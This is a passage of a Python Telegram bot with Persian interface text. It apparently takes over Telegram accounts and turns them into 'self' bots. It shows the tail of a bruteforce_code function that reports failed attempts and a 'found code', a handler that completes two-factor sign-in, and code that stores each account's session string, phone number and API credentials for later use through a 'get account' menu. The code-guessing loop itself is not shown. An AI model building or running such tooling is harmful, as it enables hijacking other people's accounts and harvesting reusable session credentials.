📱 شماره: <code>{phone}</code>
📊 تعداد تلاش‌ها: {attempt}

ممکن است:
• شماره تلفن اشتباه باشد
• کد قبلاً منقضی شده باشد
• اکانت دارای محدودیت باشد

لطفاً دوباره تلاش کنید.
""",
                chat_id=update.effective_chat.id,
                message_id=msg.message_id,
                parse_mode='HTML'
            )
            
    except Exception as e:
        logger.error(f"Error in bruteforce_code: {e}")
        try:
            await context.bot.edit_message_text(
                f"❌ خطا: {str(e)[:200]}",
                chat_id=update.effective_chat.id,
                message_id=msg.message_id,
                parse_mode='HTML'
            )
        except:
            pass
        await clear_user_session(user_id)

# ============ دریافت پسورد دستی ============
async def handle_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    password = update.message.text.strip()
    
    if user_id not in user_sessions or user_sessions[user_id].get("step") != "password":
        await update.message.reply_text("❌ لطفاً از دکمه ورود استفاده کنید.", parse_mode='HTML')
        return
    
    data = user_sessions[user_id]
    client = data.get('client')
    code = data.get('code_found')
    phone = data.get('phone')
    api_id = data.get('api_id')
    api_hash = data.get('api_hash')
    
    if not client:
        await update.message.reply_text("❌ اتصال معتبر نیست. دوباره تلاش کنید.", parse_mode='HTML')
        await clear_user_session(user_id)
        return
    
    try:
        await client.sign_in(password=password)
        session_string = client.session.save()
        await client.disconnect()
        
        account_name = "بدون نام"
        try:
            client2 = TelegramClient(StringSession(session_string), api_id, api_hash)
            await client2.connect()
            if await client2.is_user_authorized():
                me = await client2.get_me()
                account_name = me.first_name if me.first_name else "کاربر"
            await client2.disconnect()
        except:
            pass
        
        user_id_str = str(user_id)
        if user_id_str not in self_data:
            self_data[user_id_str] = []
        
        time_str = datetime.now().strftime("%H:%M")
        date_str = datetime.now().strftime("%Y/%m/%d")
        
        self_data[user_id_str].append({
            "session": session_string,
            "phone": phone,
            "api_id": api_id,
            "api_hash": api_hash,
            "account_name": account_name,
            "active": True,
            "clock_active": False,
            "active_time": "تنظیم نشده",
            "font_type": "1",
            "created": f"{date_str} {time_str}",
            "last_update": f"{date_str} {time_str}"
        })
        save_data()
        
        await clear_user_session(user_id)
        
        text = f"""
✅ <b>سلف با موفقیت ساخته شد!</b>

📱 شماره: <code>{phone}</code>
👤 نام اکانت: <b>{account_name}</b>
🔑 کد پیدا شده: <code>{code}</code>

🎯 سلف به لیست شما اضافه شد.
"""
        
        keyboard = [
            [InlineKeyboardButton("🔑 ساخت سلف جدید", callback_data="new_session")],
            [InlineKeyboardButton("📱 گرفتن اکانت", callback_data="get_account")],
            [InlineKeyboardButton("🏠 بازگشت به منو", callback_data="back")]
        ]
        
        await update.message.reply_text(
            text,
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='HTML'
        )
        
    except Exception as e:
        await update.message.reply_text(
            f"❌ رمز عبور اشتباه است.\n\n{str(e)[:100]}\n\nلطفاً دوباره وارد کنید:",
            parse_mode='HTML'
        )

# ============ بازگشت ============
async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    try:
        await query.answer()
    except:
        pass
    
    user_id = query.from_user.id
    await clear_user_session(user_id)
    
    if str(user_id) in login_sessions:
        del login_sessions[str(user_id)]
    
    await main_menu(update, context, edit=True)

# ============ دستور start ============
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await main_menu(update, context)

# ============ هندلر پیام‌ها ============
async def handle_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # بررسی گرفتن اکانت
    if str(user_id) in login_sessions and login_sessions[str(user_id)].get('step') == 'waiting_code':
        await handle_get_account_code(update, context)
        return
    
    if user_id in user_sessions:
        step = user_sessions[user_id].get("step")
        if step == "phone":
            await handle_phone(update, context)
        elif step == "api_id":
            await handle_api_id(update, context)
        elif step == "api_hash":
            await handle_api_hash(update, context)
        elif step == "password":
            await handle_password(update, context)
        return
    
    await update.message.reply_text("❌ لطفاً از دکمه‌های منو استفاده کنید.", parse_mode='HTML')

# ============ اجرا ============
def main():
    try:
        delete_webhook()
        
        print("=" * 60)
        print("🤖 ربات ساخت خودکار سلف")
        print("=" * 60)
        print(f"📌 توکن: {TOKEN[:10]}...{TOKEN[-5:]}")
        print("=" * 60)
        
        application = Application.builder().token(TOKEN).build()
        
        application.add_handler(CallbackQueryHandler(new_session, pattern="^new_session$"))
        application.add_handler(CallbackQueryHandler(get_account, pattern="^get_account$"))
        application.add_handler(CallbackQueryHandler(select_account, pattern="^select_account_"))
        application.add_handler(CallbackQueryHandler(back_to_menu, pattern="^back$"))
        
        application.add_handler(CommandHandler("start", start))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_messages))
        
        print("✅ ربات با موفقیت راه‌اندازی شد.")
        print("💡 برای شروع از /start استفاده کنید.")
        print("=" * 60)
        
        application.run_polling(drop_pending_updates=True)
        
    except Exception as e:
        print(f"❌ خطا: {e}")

if __name__ == "__main__":
    main()
